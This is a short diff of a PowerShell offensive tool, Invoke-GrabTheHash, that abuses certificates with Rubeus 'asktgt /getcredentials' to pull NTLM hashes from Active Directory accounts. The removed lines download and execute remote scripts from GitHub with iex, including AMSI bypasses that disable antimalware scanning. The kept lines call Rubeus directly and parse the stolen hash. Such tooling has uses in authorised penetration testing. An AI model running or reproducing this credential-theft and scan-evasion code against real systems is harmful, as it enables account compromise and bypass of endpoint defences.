@@ -169,11 +169,8 @@ function Invoke-GrabTheHash
 	}
 
  	if($PFX){
-		iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1')
-		iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1') > $null
-		iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Rubeus.ps1')
 		
-		$RubOutput = Invoke-Rubeus asktgt /user:$CN /certificate:$PFX /nowrap /getcredentials /enctype:aes256 /domain:$currentDomain
+		$RubOutput = Rubeus asktgt /user:$CN /certificate:$PFX /nowrap /getcredentials /enctype:aes256 /domain:$currentDomain
 		
 		if ($RubOutput -match "NTLM\s+:\s+([A-Fa-f0-9]{32})") {
 			$ntlmValue = $Matches[1]
@@ -356,12 +353,8 @@ CertificateTemplate = "$TemplateName"
 		Write-Output ""
 		break
 	}
-		
-	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1')
-	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/NETAMSI.ps1') > $null
-	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Rubeus.ps1')
 	
-	$RubOutput = Invoke-Rubeus asktgt /user:$CN /certificate:$pwd\$CN.pfx /nowrap /getcredentials /enctype:aes256 /domain:$currentDomain
+	$RubOutput = Rubeus asktgt /user:$CN /certificate:$pwd\$CN.pfx /nowrap /getcredentials /enctype:aes256 /domain:$currentDomain
 	
 	if ($RubOutput -match "NTLM\s+:\s+([A-Fa-f0-9]{32})") {
 		$ntlmValue = $Matches[1]
